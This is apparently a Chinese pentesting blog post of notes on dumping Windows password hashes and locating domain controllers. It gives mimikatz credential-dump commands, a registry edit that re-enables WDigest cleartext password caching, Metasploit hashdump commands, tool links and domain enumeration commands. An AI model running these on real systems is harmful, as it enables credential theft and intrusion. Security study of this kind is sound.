---
layout:     post
title:      Windows获取用户hash 以及 域控查找
subtitle:   简单记录一下 
date:       2021-02-22
author:     BY Diego
header-img: https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/5cf4cae0e7bce7210c066936.jpg
catalog: true
tags:
    - Windows
    - 域渗透
    - 渗透测试
---

## 获取windows 用户hash

因为系统不同 以及各自的策略不同 ，因此需要多个工具配合使用

### mimikatz.exe

该工具kali自带 拷贝出来直接用

![image-20210222122318484](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210222122318484.png)

```shell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit" 
```



> 另外，需要注意的是，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，如下图，密码字段显示为null，此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取

```shell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```



![image-20210214174140256](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210214174140256.png)



###  pwdump7

下载地址

https://www.tarasco.org/security/pwdump_7/

![image-20210214174340819](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210214174340819.png)



### getpass

直接运行即可

![image-20210214174707441](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210214174707441.png)



### QuarksPwDump

https://www.webshell.cc/4625.html

-h 查看用法

--dump-hash-local --with-history

![image-20210214181149766](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210214181149766.png)





### lazagne

挺强大的工具 🐂🍺

项目地址 https://github.com/AlessandroZ/LaZagne

支持的模块

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210215111414316.png)



使用 或者直接下载exe 亦或者自己编译

![image-20210215111334170](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210215111334170.png)



### metasploit

获取到shell之后 执行

```shell
run windows/gather/smart_hashdump
```



![image-20210215141154910](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210215141154910.png)



```
run hashdump
```

![image-20210215141819578](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210215141819578.png)





## 域控查找



1. 当域控 与dns 为同一服务器时 dns 服务器地址为 域控地址

2. nslookup -type=SRV   _ldap.\_tcp

   ![B64B212A39327C186F388D7E9D7878C6](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/B64B212A39327C186F388D7E9D7878C6.png)

3. net group "Domain Controllers" /domain

   ![5449F3A1A8C29A0BE2ABB2CD77AB412E](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/5449F3A1A8C29A0BE2ABB2CD77AB412E.png)

4. nltest /DCLIST:域名

   ![153472490C49CFB7E5F64A5E0CE51D55](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/153472490C49CFB7E5F64A5E0CE51D55.png)

5. net time /domain

   ![DEA0420B299ADFCCF74050B8EF0A7A83](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/DEA0420B299ADFCCF74050B8EF0A7A83.png)

6. set logon 列出以logon开头的变量

   ![9AE2FC2A3BE11CD5B2922EDDFFDA0B7A](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/9AE2FC2A3BE11CD5B2922EDDFFDA0B7A.png)

7. net view /domain:域
   ![A6703C4F86F83FEB455BBD69A164F256](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/A6703C4F86F83FEB455BBD69A164F256.png)

